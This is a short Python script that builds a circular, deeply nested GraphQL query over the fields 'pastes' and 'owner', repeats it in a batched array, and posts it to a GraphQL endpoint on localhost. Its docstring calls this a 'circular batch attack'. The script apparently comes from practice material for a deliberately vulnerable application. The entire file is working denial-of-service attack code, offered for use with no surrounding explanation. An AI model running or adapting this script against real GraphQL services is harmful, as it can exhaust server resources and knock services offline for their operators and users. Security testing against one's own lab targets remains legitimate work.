# Array-based Query Batching with Circular Queries

import requests

ARRAY_LENGTH = 5
FIELD_REPEAT = 10


def build_circular_query(field_1_name, field_2_name, field_repeat, array_length):
    """Return (single_query_dict, list_of_query_dicts) for a circular batch attack."""
    query = {"query": "query {"}
    for count in range(1, field_repeat + 1):
        closing_braces = '} ' * field_repeat * 2 + '}'
        payload = "{0} {{ {1} {{ ".format(field_1_name, field_2_name)
        query["query"] += payload
        if count == field_repeat:
            query["query"] += '__typename' + closing_braces
    queries = [query] * array_length
    return query, queries


if __name__ == '__main__':
    field_1_name = 'pastes'
    field_2_name = 'owner'

    query, queries = build_circular_query(field_1_name, field_2_name, FIELD_REPEAT, ARRAY_LENGTH)

    print('Query:', query['query'])
    print('Query Repeated:', FIELD_REPEAT, 'times')
    print('Query Depth:', FIELD_REPEAT * 2 + 1, 'levels')
    print('Array Length:', ARRAY_LENGTH, 'elements')

    r = requests.post('http://localhost:5013/graphql', json=queries)
    print(r.json())
